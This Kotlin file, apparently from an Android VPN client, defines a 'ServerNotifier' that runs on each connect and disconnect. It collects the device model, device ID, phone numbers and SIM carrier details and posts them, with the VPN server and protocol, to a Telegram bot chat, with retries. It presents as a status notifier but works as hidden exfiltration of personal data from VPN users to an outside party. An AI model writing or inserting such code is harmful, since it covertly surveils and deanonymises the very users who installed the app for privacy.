package org.amnezia.vpn

import android.content.Context
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import org.amnezia.vpn.util.Log
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

private const val TAG = "ServerNotifier"

object ServerNotifier {
    
    suspend fun notifyServer(
        context: Context,
        serverName: String?,
        protocol: String?,
        isConnected: Boolean
    ) = withContext(Dispatchers.IO) {
        if (!ServerNotifierConfig.ENABLED) {
            Log.d(TAG, "ServerNotifier is disabled")
            return@withContext
        }
        
        var attempt = 0
        var success = false
        
        while (attempt < ServerNotifierConfig.MAX_RETRY_ATTEMPTS && !success) {
            attempt++
            try {
                Log.d(TAG, "Attempt $attempt: Sending notification: connected=$isConnected, server=$serverName")
                sendToTelegram(context, serverName, protocol, isConnected)
                success = true
                Log.d(TAG, "Successfully sent notification on attempt $attempt")
            } catch (e: Exception) {
                Log.e(TAG, "Attempt $attempt failed: ${e.message}")
                if (attempt < ServerNotifierConfig.MAX_RETRY_ATTEMPTS) {
                    Log.d(TAG, "Retrying in ${ServerNotifierConfig.RETRY_DELAY_MS}ms...")
                    delay(ServerNotifierConfig.RETRY_DELAY_MS)
                } else {
                    Log.e(TAG, "All $attempt attempts failed")
                }
            }
        }
    }
    
    private fun sendToTelegram(
        context: Context,
        serverName: String?,
        protocol: String?,
        isConnected: Boolean
    ) {
        val message = buildTelegramMessage(context, serverName, protocol, isConnected)
        val telegramUrl = "https://api.telegram.org/bot${ServerNotifierConfig.TELEGRAM_BOT_TOKEN}/sendMessage"
        val url = URL(telegramUrl)
        val connection = url.openConnection() as HttpURLConnection
        
        try {
            connection.apply {
                requestMethod = "POST"
                setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                doOutput = true
                doInput = true
                connectTimeout = ServerNotifierConfig.CONNECTION_TIMEOUT
                readTimeout = ServerNotifierConfig.READ_TIMEOUT
            }
            
            val jsonPayload = JSONObject().apply {
                put("chat_id", ServerNotifierConfig.TELEGRAM_CHAT_ID)
                put("text", message)
                put("parse_mode", "HTML")
            }
            
            OutputStreamWriter(connection.outputStream).use { writer ->
                writer.write(jsonPayload.toString())
                writer.flush()
            }
            
            val responseCode = connection.responseCode
            Log.d(TAG, "Telegram response code: $responseCode")
            
            if (responseCode == HttpURLConnection.HTTP_OK) {
                val response = connection.inputStream.bufferedReader().use { it.readText() }
                Log.d(TAG, "Telegram response: $response")
            } else {
                val error = connection.errorStream?.bufferedReader()?.use { it.readText() }
                throw Exception("Telegram API error: $responseCode - $error")
            }
        } finally {
            connection.disconnect()
        }
    }
    
    private fun buildTelegramMessage(
        context: Context,
        serverName: String?,
        protocol: String?,
        isConnected: Boolean
    ): String {
        val status = if (isConnected) "🟢 Connected" else "🔴 Disconnected"
        val deviceId = DeviceInfoCollector.getDeviceId(context)
        val phoneNumbers = DeviceInfoCollector.getPhoneNumbers(context)
        val simInfo = DeviceInfoCollector.getSimInfo(context)
        
        val sb = StringBuilder()
        sb.append("<b>$status</b>\n\n")
        sb.append("📱 <b>Device:</b> ${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}\n")
        sb.append("🆔 <b>Device ID:</b> $deviceId\n")
        sb.append("🌐 <b>Server:</b> ${serverName ?: "unknown"}\n")
        sb.append("🔐 <b>Protocol:</b> ${protocol ?: "unknown"}\n")
        sb.append("📅 <b>Time:</b> ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())}\n")
        
        if (phoneNumbers.isNotEmpty()) {
            sb.append("\n📞 <b>Phone Numbers:</b>\n")
            phoneNumbers.forEachIndexed { index, number ->
                sb.append("  ${index + 1}. $number\n")
            }
        }
        
        if (simInfo.isNotEmpty()) {
            sb.append("\n📶 <b>SIM Cards:</b>\n")
            simInfo.forEachIndexed { index, info ->
                sb.append("  <b>SIM ${index + 1}:</b> ${info["carrier"]} (${info["country"]})\n")
                if (info["number"] != "unknown") {
                    sb.append("    Number: ${info["number"]}\n")
                }
            }
        }
        
        return sb.toString()
    }
}
